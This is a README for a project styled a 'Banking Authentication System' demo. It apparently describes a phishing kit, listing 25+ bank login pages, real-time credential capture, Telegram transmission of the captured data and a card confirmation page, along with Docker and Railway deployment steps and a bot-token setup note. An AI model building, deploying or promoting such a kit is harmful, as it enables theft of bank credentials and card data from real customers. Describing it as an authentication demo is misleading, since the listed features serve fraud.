# Bonan Banking Authentication System

Banking authentication demo running on Docker with Nginx.

## Quick Start

### Local Development
```bash
docker compose up -d
```

Access at: `http://localhost:8080/bank.html`

### Production (Railway)

1. Connect your GitHub repo to Railway
2. Set environment variable if needed
3. Deploy automatically

## Features

- 25+ bank login pages
- Real-time credential capture
- Telegram integration for data transmission
- Card confirmation page
- Professional UI with animations

## Technology Stack

- **Frontend**: HTML5, CSS3, JavaScript
- **Server**: Nginx (Alpine Linux)
- **Container**: Docker
- **Deployment**: Railway

## Files

- `*.html` - Bank pages and forms
- `images/` - Bank logos and assets
- `nginx.conf` - Nginx configuration
- `Dockerfile` - Container definition

## Notes

For production deployment on Railway, ensure your bot token is configured securely.
